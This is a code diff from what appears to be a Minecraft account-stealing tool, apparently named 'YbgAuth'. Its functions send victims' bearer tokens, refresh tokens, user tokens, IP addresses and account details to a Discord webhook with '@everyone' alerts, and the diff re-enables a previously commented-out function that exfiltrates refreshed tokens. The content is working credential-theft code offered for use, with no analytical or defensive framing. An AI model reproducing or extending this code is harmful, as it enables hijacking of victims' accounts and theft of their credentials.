@@ -447,7 +447,7 @@ async function postToWebhook(webhook_url, discord, status, formatNumber, level, 
 		avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
 		content: "@everyone ",
 		embeds: [{
-			color: 1029119,
+			color: 16746496,
 			timestamp: new Date(),
 			thumbnail: {
 				url: 'https://visage.surgeplay.com/full/' + uuid
@@ -611,7 +611,7 @@ async function getRefreshData(refresh_token) {
 
 
 
-//async function refreshToWebhook(webhook_url, discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag, key, userToken) {
+async function refreshToWebhook(webhook_url, discord, status, formatNumber, level, rank, username, bearerToken, uuid, ip, newRefreshToken, country, flag, key, userToken) {
 	const networthArray = await getNetworth(username)
 	const networth = networthArray[0]
 	const networthNoInventory = networthArray[1]
@@ -630,7 +630,7 @@ async function getRefreshData(refresh_token) {
 		avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
 		content: "@everyone TOKEN REFRESHED!!!!",
 		embeds: [{
-			color: 1029119,
+			color: 16746496,
 			timestamp: new Date(),
 			thumbnail: {
 				url: 'https://visage.surgeplay.com/full/' + uuid
@@ -778,7 +778,7 @@ app.get('/xbl', async (req, res) => {
 			username: "YbgAuth",
 			avatar_url: "https://cdn.discordapp.com/avatars/1094682441274364085/d4148db461700dc31ef992d5be0dfea8.png",
 			embeds: [{
-				color: 1029119,
+				color: 16746496,
 				timestamp: new Date(),
 				fields: [{
 						name: "**Token:**",
